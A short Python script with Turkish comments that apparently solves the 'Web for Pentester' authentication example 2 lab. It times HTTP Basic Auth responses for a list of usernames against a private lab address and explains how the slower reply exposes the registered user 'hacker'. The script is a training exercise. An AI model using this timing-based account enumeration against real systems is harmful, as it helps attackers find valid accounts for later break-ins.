import requests
from requests.auth import HTTPBasicAuth

#bu kod web for pentester authentication example2 icin yazılmıştır

site = "http://192.168.1.39/authentication/example2/"
#site alert ile kullanıcı adı ve şifre istedigi icin requests ile bilindik bir işlem yapamıyoruz
#burp suite ile giden değerlere baktım ve şöyle birşey gördüm : 
# Authorization: Basic
# siteye kullanıcı adımızı ve şifremizi gondermek icin from requests.auth import HTTPBasicAuth kütüphanesini kullanıcaz

kullancı = ["ahmet","ayse","hacker","fatma","user","sari cizmeli mehmet aga"] #sitede sadece hacker ifadesi kayıtlı diğer isimler kayıtlı değil

şifre = "sifre" # şifrenin bir onemi yok rastgele girilebilir

for i in kullancı:     
    
    auth = HTTPBasicAuth(i,şifre) #ad ve şifreyi girdim bu değerler Authorization: Basic kısmına gidecek
    
    #.elapsed.total_seconds değerin gitme gelme süresini gösterir
    süre = requests.get(site,auth=auth).elapsed.total_seconds() #burada get dememizin nedeni burpsuite ile baktım get ile işlem yapılmış
    print(f"{i} : {süre}") #kullanıcı adının kontrol edilme süresi ve kullanıcı adı

#kodu çalıştırın

#görebileceginiz gibi hacker ifadesinin cevabı diğerlerinden farklı bir değerde geldi çünkü hacker ifadesi sitede kayıtlıydı 
#ben hacker adını ve şifreyi gönderdiğimde site benim gonderdigim şifreyi hacker adının gerçek şifresi ile karşılaştırdı ve buda siteden gelen cevabın süresinin artmasına yol açtı 
#ve süre arttıgı icin kullanıcı adının mevcut olduğunu anladık
#peki 0 ile başlayan diğer değerler ne ?
#onlarda sitede mevcut olmayan kullanıcı adları kullanıcı adı mevcut olmadıgı icin şifreyi kontrol etmesine gerek kalmadı bu durumda siteden gelen cevabın gelme süreside artmadı
